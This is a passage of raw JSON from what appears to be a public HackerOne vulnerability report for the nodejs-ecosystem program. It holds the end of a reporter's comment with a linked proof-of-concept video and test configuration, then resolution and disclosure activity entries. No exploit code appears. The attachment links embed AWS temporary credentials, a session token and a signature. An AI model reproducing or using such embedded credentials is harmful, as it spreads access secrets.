src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tUUWew9MTL332fRAraDE1p8Z?response-content-disposition=attachment%3B%20filename%3D%22poc_fix_surfer.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_fix_surfer.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070943Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=f91c09958e3707ef324fea46751658be78d95e4a4f0370db61159aaad285b32f\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThank you for your time and have a nice day,\u003cbr\u003e\nd3lla\u003c/p\u003e\n\n\u003cp\u003eI tested using the following configurations:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\u003c/li\u003e\n\u003cli\u003eNODEJS VERSION: v14.2.0\u003c/li\u003e\n\u003cli\u003eNPM VERSION: 6.14.4\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2020-08-21T16:11:22.314Z","updated_at":"2020-08-21T16:12:00.052Z","actor":{"username":"d3lla","cleared":false,"url":"/d3lla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":958371,"filename":"poc_fix_surfer.mov","type":"video/quicktime","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tUUWew9MTL332fRAraDE1p8Z?response-content-disposition=attachment%3B%20filename%3D%22poc_fix_surfer.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_fix_surfer.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070943Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=f91c09958e3707ef324fea46751658be78d95e4a4f0370db61159aaad285b32f"}],"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9005561,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-21T20:49:10.929Z","updated_at":"2020-08-21T20:49:10.929Z","actor":{"username":"danielruf","cleared":false,"url":"/danielruf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"d3lla","url":"/d3lla"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9005563,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-21T20:49:19.828Z","updated_at":"2020-08-21T20:49:19.828Z","first_to_agree":true,"actor":{"username":"danielruf","cleared":false,"url":"/danielruf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9008037,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-22T08:48:44.167Z","updated_at":"2020-08-22T08:48:44.167Z","actor":{"username":"d3lla","cleared":false,"url":"/d3lla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9008038,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-22T08:48:44.209Z","updated_at":"2020-08-22T08:48:44.209Z","actor":{"username":"d3lla","cleared":false,"url":"/d3lla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}